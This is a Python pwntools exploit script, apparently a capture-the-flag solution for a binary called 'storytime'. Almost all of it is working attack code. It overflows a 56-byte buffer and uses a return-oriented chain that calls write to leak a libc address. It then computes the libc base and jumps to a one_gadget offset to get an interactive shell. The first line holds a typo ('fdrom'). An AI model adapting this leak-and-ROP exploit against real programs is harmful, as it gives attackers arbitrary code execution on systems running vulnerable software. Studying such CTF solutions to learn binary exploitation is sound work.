fdrom pwn import * 

p = process("./storytime")
elf = ELF('libc-2.27.so')


pop_rdi = 0x400703  # : pop rdi ; ret
pop_rsi_pop_r15 = 0x400701 #: pop rsi ; pop r15 ; ret

main = 0x40062e                 #0x00000000040062e <main>:
write_got = 0x601018
write_plt = 0x4004a0
climax_addr = 0x40060e #<climax>:


payload = 'a'*56
payload += p64(pop_rdi)   
payload += p64(0x1)               #rdi=1
payload += p64(pop_rsi_pop_r15)   #rsi=write@got
payload += p64(write_got)         #r15=8
payload += p64(0x8)
payload += p64(write_plt)         #call write(rdi,rsi,rdx)
payload += p64(main)              

p.recvuntil("Tell me a story: \n")
p.sendline(payload)
leak_addr_write = u64(p.recv(8))
log.info("Leak Address: " + hex(leak_addr_write))


base = leak_addr_write - elf.symbols['write']
log.info("Base Address: " + hex(base))

#one shot

one_gadget = base + 0x4f365

#system_libc = base + elf.symbols['system']
#bin_sh_libc = base + 0x1b40fa

#log.info("System: "+ hex(system_libc))
#log.info("BinSh: " + hex(bin_sh_libc))


payload1 = 'a' * 56
payload1 += p64(one_gadget)
#payload += p64(pop_rdi)
#payload += p64(bin_sh_libc)
#payload += p64(system_libc)

p.recvuntil("Tell me a story: \n")
p.sendline(payload1)
p.interactive()
